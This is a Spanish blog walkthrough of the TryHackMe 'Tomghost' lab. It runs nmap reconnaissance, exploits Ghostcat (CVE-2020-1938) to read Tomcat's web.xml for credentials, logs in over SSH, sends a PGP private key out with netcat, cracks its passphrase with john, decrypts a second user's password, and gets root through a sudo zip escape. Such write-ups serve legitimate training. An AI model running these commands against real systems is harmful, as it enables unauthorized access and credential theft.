---
title: Try Hack Me Tomghost
author: k4miyo
date: 2023-06-15
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Injection, CMS Exploit]
ping: true
---

## Máquina Tomghost
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.168.168.

```bash
❯ ping -c 1 10.10.168.168
PING 10.10.168.168 (10.10.168.168) 56(84) bytes of data.
64 bytes from 10.10.168.168: icmp_seq=1 ttl=63 time=155 ms

--- 10.10.168.168 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 154.990/154.990/154.990/0.000 ms

```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS -T 5 -v -n 10.10.168.168 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 21:06 CST
Initiating Ping Scan at 21:06
Scanning 10.10.168.168 [4 ports]
Completed Ping Scan at 21:06, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:06
Scanning 10.10.168.168 [65535 ports]
Discovered open port 53/tcp on 10.10.168.168
Discovered open port 22/tcp on 10.10.168.168
Discovered open port 8080/tcp on 10.10.168.168
Discovered open port 8009/tcp on 10.10.168.168
Completed SYN Stealth Scan at 21:07, 41.96s elapsed (65535 total ports)
Nmap scan report for 10.10.168.168
Host is up (0.16s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds
           Raw packets sent: 72039 (3.170MB) | Rcvd: 70362 (2.814MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.168.168
   5   │     [*] Open ports: 22,53,8009,8080
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,53,8009,8080 10.10.168.168 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 21:10 CST
Nmap scan report for 10.10.168.168
Host is up (0.16s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
```

Validando el servicio web, usando primeramente  `whatweb`, no vemos nada interesante.

```
❯ whatweb http://10.10.168.168:8009/
ERROR Opening: http://10.10.168.168:8009/ - end of file reached
❯ whatweb http://10.10.168.168:8080/
http://10.10.168.168:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.168.168], Title[Apache Tomcat/9.0.30]
```

Si tratamos de acceder vía web a través del puerto 8080, solo observamos la página por defecto de Apache Tomcat. Podríamos tratar de acceder a la ruta **/manager/html/** para trata de acceder al servicios, pero no tenemos éxito.

![""](/assets/images/thm-tomghost/tomghost.png)

![""](/assets/images/thm-tomghost/tomghost1.png)

Vamos a tratar de buscar alguna vulnerabilidad asociada a la versión de tomcat y encontramos el siguiente CVE y repositorio:

 - [CVE-2020-1938](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md)

Para nuestro caso, vamos a utiizar el repositorio [CVE-2020-1938](https://github.com/dacade/CVE-2020-1938) para utilizar python3. Por lo tanto, nos descargamos los recursos a nuestra máquina:

```
❯ git clone https://github.com/dacade/CVE-2020-1938
Cloning into 'CVE-2020-1938'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 15 (delta 3), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), 6.74 KiB | 6.74 MiB/s, done.
Resolving deltas: 100% (3/3), done.
```

Ejecutamos el script de acuerdo a como nos indica el dueño del repositorio:

```
❯ cd CVE-2020-1938
❯ python3 tomcat.py 10.10.168.168 -f /WEB-INF/web.xml -p 8009
Getting resource at ajp13://10.10.168.168:8009/hissec
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

Observamos unas credenciales en la parte inferior, `skyfuck:8730281lkjlkjdqlksalks` y recordando, se tiene abierto el puerto 22; por lo que podriamos tratar de acceder vía ssh con las credenciales obtenidas.

```
❯ ssh skyfuck@10.10.168.168
The authenticity of host '10.10.168.168 (10.10.168.168)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.168.168' (ECDSA) to the list of known hosts.
skyfuck@10.10.168.168's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ whoami
skyfuck
skyfuck@ubuntu:~$
```

Ya podemos acceder a la máquina y podemos leer la primera flag (user.txt). Ahora debemos encontrar alguna forma de escalar privilegios. Dentro del directorio HOME del usuario skyfuck vemos el archivo `tryhackme.asc`; la cual se trata de una llave PGP privada.

```
skyfuck@ubuntu:~$ ls -la
total 40
drwxr-xr-x 3 skyfuck skyfuck 4096 Jun 15 20:53 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Jun 15 20:53 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
skyfuck@ubuntu:~$ cat tryhackme.asc 
skyfuck@ubuntu:~$ cat tryhackme.asc 
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
3TxA9u2jV73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEf
StRTV1+ZmgcAjjwzr2B6qplWHhyi9PIzefiw1smqSK31MBWGamkKp/vRB5xMoOr5
ZsFq67z/5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFD
B0zktqArgROuSQ8sftGYkS/uVtyna6qbF4ywND8P6BMpLIsTKhn+r2KwLcihLtPk
V0K3Dfh+6bZeIVam50QgOAXqvetuIyTt7PiCXbvOpQO3OIDgAZDLodoKdTzuaXLa
cuNXmg/wcRELmhiBsKYYCTFtzdF18Pd9cM0L0mVy/nfhQKFRGx9kQkHweXVt+Pbb
3AwfUyH+CZD5z74jO53N2gRNibUPdVune7pGQVtgjRrvhBiBJpajtzYG+PzBomOf
RGZzGSgWQgYg3McBALTlTlmXgobn9kkJTn6UG/2Hg7T5QkxIZ7yQhPp+rOOhDACY
hloI89P7cUoeQhzkMwmDKpTMd6Q/dT+PeVAtI9w7TCPjISadp3GvwuFrQvROkJYr
WAD6060AMqIv0vpkvCa471xOariGiSSUsQCQI/yZBNjHU+G44PIq+RvB5F5O1oAO
wgHjMBAyvCnmJEx4kBVVcoyGX40HptbyFJMqkPlXHH5DMwEiUjBFbCvXYMrOrrAc
1gHqhO+lbKemiT/ppgoRimKy/XrbOc4dHBF0irCloHpvnM1ShWqT6i6E/IeQZwqS
9GtjdqEpNZ32WGpeumBoKprMzz7RPPZPN0kbyDS6ThzhQjgBnQTr9ZuPHF49zKwb
nJfOFoq4GDhpflKXdsx+xFO9QyrYILNl61soYsC65hQrSyH3Oo+B46+lydd/sjs0
sdrSitHGpxZGT6osNFXjX9SXS9xbRnS9SAtI+ICLsnEhMg0ytuiHPWFzak0gVYuy
RzWDNot3s6laFm+KFcbyg08fekheLXt6412iXK/rtdgePEJfByH+7rfxygdNrcML
/jXI6OoqQb6aXe7+C8BK7lWC9kcXvZK2UXeGUXfQJ4Fj80hK9uCwCRgM0AdcBHh+
ECQ8dxop1DtYBANyjU2MojTh88vPDxC3i/eXav11YyxetpwUs7NYPUTTqMqGpvCI
D5jxuFuaQa3hZ/rayuPorDAspFs4iVKzR+GSN+IRYAys8pdbq+Rk8WS3q8NEauNh
d07D0gkSm/P3ewH+D9w1lYNQGYDB++PGLe0Tes275ZLPjlnzAUjlgaQTUxg2/2NX
Z7h9+x+7neyV0Io8H7aPvDDx/AotTwFr0vK5RdgaCLT1qrF9MHpKukVHL3jkozMl
DCI4On25eBBZEccbQfrQYUdnhy7DhSY3TaN4gQMNYeHBahgplhLpccFKTxXPjiQ5
8/RW7fF/SX6NN84WVcdrtbOxvif6tWN6W3AAHnyUks4v3AfVaSXIbljMMe9aril4
aqCFd8GZzRC2FApSVZP0QwZWyqpzq4aXesh7KzRWdq3wsQLwCznKQrayZRqDCTSE
Ef4JAwLI8nfS+vl0gGAMmdXa6CFvIVW6Kr/McfgYcT7j9XzJUPj4kVVnmr4kdsYr
vSht7Q4En4htMtK56wb0gul3DHEKvCkD8e1wr2/MIvVgh2C+tCF0cnloYWNrbWUg
PHN0dXhuZXRAdHJ5aGFja21lLmNvbT6IXgQTEQoABgUCXmhyYgAKCRCPPaPexnBx
cFBNAP9T2iXSmHSSo4MSfVeNI53DShljoNwCxQRiV2FKAfvulwEAnSplHzpTziUU
7GqZAaPEthfqJPQ4BgZTDEW+CD9tNuydAcAEXmhyYhAEAP//////////yQ/aoiFo
wjTExmKLgNwc0SkCTgiKZ8x0Agu+pjsTmyJRSgh5jjQE3e+VGbPNOkMbMCsKbfJf
FDdP4TVtbVHCReSFtXZiXn7G9ExC6aY37WsL/1y29Aa37e44a/taiZ+lrp8kEXxL
H+ZJKGZR7OZTgf//////////AAICA/9I+iaF1JFJMOBrlvH/BPbfKczlAlJSKxLV
90kq4Sc1orioN1omcbl2jLJiPM1VnqmxmHbr8xts4rrQY1QPIAcoZNlAIIYfogcj
YEF6L5YBy30dXFAxGOQgf9DUoafVtiEJttT4m/3rcrlSlXmIK51syEj5opTPsJ4g
zNMeDPu0PP4JAwLI8nfS+vl0gGDeKsYkGixp4UPHQFZ+zZVnRzifCJ/uVIyAHcvb
u2HLEF6CDG43B97BVD36JixByu30pSM+A+qD5Nj34bhvetyBQNIuE9YR2YIyXf/R
Uxr9P3GoDDJZfL6Hn9mQ+T9kvZQzlroWTYudyEJ6xWDlJP5QODkCZoWRYxj54Vuc
kaiEm1gCKVXU4qpElfr5iqK1AYRPBWt8ODk8uK/v5bPgIRIGp+6+6GIqiF4EGBEK
AAYFAl5ocmIACgkQjz2j3sZwcXA7AQD/cLDGGQCpQm7TC56w8t5JffvGIyZslfaS
dsnL+MPiD2IBALNIOKy8O1uNSDTncRSvoijW1pBusC3c5zqXuM2iwP7zmQSuBF5o
cmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF3TxA9u2j
V73qFdMr5EwktTXRlEo0LTGeMzZ9R/uqe+BeBUNCZW6tqI7wDw/U1DEfStRTV1+Z
mgcAjjwzr2B6qplWHhyi9PIzefiw1smqSK31MBWGamkKp/vRB5xMoOr5ZsFq67z/
5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFDB0zktqAr
gROuSQ8sftGYkS/uVtyna6qbF4ywND8P6BMpLIsTKhn+r2KwLcihLtPkV0K3Dfh+
6bZeIVam50QgOAXqvetuIyTt7PiCXbvOpQO3OIDgAZDLodoKdTzuaXLacuNXmg/w
cRELmhiBsKYYCTFtzdF18Pd9cM0L0mVy/nfhQKFRGx9kQkHweXVt+Pbb3AwfUyH+
CZD5z74jO53N2gRNibUPdVune7pGQVtgjRrvhBiBJpajtzYG+PzBomOfRGZzGSgW
QgYg3McBALTlTlmXgobn9kkJTn6UG/2Hg7T5QkxIZ7yQhPp+rOOhDACYhloI89P7
cUoeQhzkMwmDKpTMd6Q/dT+PeVAtI9w7TCPjISadp3GvwuFrQvROkJYrWAD6060A
MqIv0vpkvCa471xOariGiSSUsQCQI/yZBNjHU+G44PIq+RvB5F5O1oAOwgHjMBAy
vCnmJEx4kBVVcoyGX40HptbyFJMqkPlXHH5DMwEiUjBFbCvXYMrOrrAc1gHqhO+l
bKemiT/ppgoRimKy/XrbOc4dHBF0irCloHpvnM1ShWqT6i6E/IeQZwqS9GtjdqEp
NZ32WGpeumBoKprMzz7RPPZPN0kbyDS6ThzhQjgBnQTr9ZuPHF49zKwbnJfOFoq4
GDhpflKXdsx+xFO9QyrYILNl61soYsC65hQrSyH3Oo+B46+lydd/sjs0sdrSitHG
pxZGT6osNFXjX9SXS9xbRnS9SAtI+ICLsnEhMg0ytuiHPWFzak0gVYuyRzWDNot3
s6laFm+KFcbyg08fekheLXt6412iXK/rtdgePEJfByH+7rfxygdNrcML/jXI6Ooq
Qb6aXe7+C8BK7lWC9kcXvZK2UXeGUXfQJ4Fj80hK9uCwCRgM0AdcBHh+ECQ8dxop
1DtYBANyjU2MojTh88vPDxC3i/eXav11YyxetpwUs7NYPUTTqMqGpvCID5jxuFua
Qa3hZ/rayuPorDAspFs4iVKzR+GSN+IRYAys8pdbq+Rk8WS3q8NEauNhd07D0gkS
m/P3ewH+D9w1lYNQGYDB++PGLe0Tes275ZLPjlnzAUjlgaQTUxg2/2NXZ7h9+x+7
neyV0Io8H7aPvDDx/AotTwFr0vK5RdgaCLT1qrF9MHpKukVHL3jkozMlDCI4On25
eBBZEccbQfrQYUdnhy7DhSY3TaN4gQMNYeHBahgplhLpccFKTxXPjiQ58/RW7fF/
SX6NN84WVcdrtbOxvif6tWN6W3AAHnyUks4v3AfVaSXIbljMMe9aril4aqCFd8GZ
zRC2FApSVZP0QwZWyqpzq4aXesh7KzRWdq3wsQLwCznKQrayZRqDCTSEEbQhdHJ5
aGFja21lIDxzdHV4bmV0QHRyeWhhY2ttZS5jb20+iF4EExEKAAYFAl5ocmIACgkQ
jz2j3sZwcXBQTQD/U9ol0ph0kqODEn1XjSOdw0oZY6DcAsUEYldhSgH77pcBAJ0q
ZR86U84lFOxqmQGjxLYX6iT0OAYGUwxFvgg/bTbsuQENBF5ocmIQBAD/////////
/8kP2qIhaMI0xMZii4DcHNEpAk4IimfMdAILvqY7E5siUUoIeY40BN3vlRmzzTpD
GzArCm3yXxQ3T+E1bW1RwkXkhbV2Yl5+xvRMQummN+1rC/9ctvQGt+3uOGv7Womf
pa6fJBF8Sx/mSShmUezmU4H//////////wACAgP/SPomhdSRSTDga5bx/wT23ynM
5QJSUisS1fdJKuEnNaK4qDdaJnG5doyyYjzNVZ6psZh26/MbbOK60GNUDyAHKGTZ
QCCGH6IHI2BBei+WAct9HVxQMRjkIH/Q1KGn1bYhCbbU+Jv963K5UpV5iCudbMhI
+aKUz7CeIMzTHgz7tDyIXgQYEQoABgUCXmhyYgAKCRCPPaPexnBxcDsBAP9wsMYZ
AKlCbtMLnrDy3kl9+8YjJmyV9pJ2ycv4w+IPYgEAs0g4rLw7W41INOdxFK+iKNbW
kG6wLdznOpe4zaLA/vM=
=dMrv
-----END PGP PRIVATE KEY BLOCK-----
skyfuck@ubuntu:~$ 
```

Nos traemos la llave a nuestra máquina para tratar de crackearla mediante `nc`:
```
skyfuck@ubuntu:~$ nc 10.9.85.95 443 < tryhackme.asc 
skyfuck@ubuntu:~$
```

```
❯ sudo nc -nlvp 443 > tryhackme.asc
[sudo] password for k4miyo: 
listening on [any] 443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.168.168] 43844
❯ ll
.rw-r--r-- k4miyo k4miyo  33 B  Thu Jun 15 21:37:29 2023  creds.txt
.rw-r--r-- k4miyo k4miyo 5.0 KB Thu Jun 15 22:03:07 2023  tryhackme.asc
```

Mediante la herramienta `gpg2john` vamos a obetener el hash del archivo **tryhackme.asc**:

```
❯ gpg2john tryhackme.asc > hash
Created directory: /home/k4miyo/.john

File tryhackme.asc
```

Una vez obtenido el hash, ahorita si podemos utilizar la herramienta `john` para obtener la contraseña:

```
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2023-06-15 22:07) 10.00g/s 10720p/s 10720c/s 10720C/s dancer1..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya contamos con las contraseña, por lo tanto, ahora vamos a import el archivo **tryhackme.asc** en la máquina víctima:

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
skyfuck@ubuntu:~$
```

Una vez importado el certificado, podemos tratar de aplicar un **decrypt** al archivo **credential.pgp**:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$
```

Ya tenemos las credenciales del usuario **merlin**, las cuales son:
 - merlin : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Por lo tanto, ya podemos migrar a dicho usuario:

```
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ whoami
merlin
merlin@ubuntu:/home/skyfuck$
```

Vamos a enumerar un poco el usuario para ver como podemos escalar privilegios:

```
merlin@ubuntu:/home/skyfuck$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:/home/skyfuck$
```

Podemos ejecutar como el usuario **root** el binario `/usr/bin/zip`; por lo que utilizando nuestra página de confianza [GTFobins](https://gtfobins.github.io/) podemos convertirnos en el usuario **root**:

```
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).